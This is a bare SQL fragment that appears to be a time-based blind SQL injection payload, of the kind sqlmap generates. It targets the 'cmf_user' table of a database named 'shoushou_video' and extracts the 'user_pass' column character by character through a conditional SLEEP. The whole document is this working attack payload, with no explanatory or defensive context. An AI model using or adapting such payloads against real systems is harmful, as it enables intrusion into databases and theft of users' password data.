( SELECT
	5024 
	FROM
		(
		SELECT
			(
				SLEEP(2- 
				(IF( ORD(
							MID(
							  ( 
								SELECT IFNULL( CAST( user_pass AS NCHAR ), 0x20 ) 
								FROM shoushou_video.cmf_user 
								ORDER BY user_pass LIMIT 417, 1 
						      ), 
							  1, 
							  1 
						    )
						) > 32,
							0,
						2 
	))))) KVoj)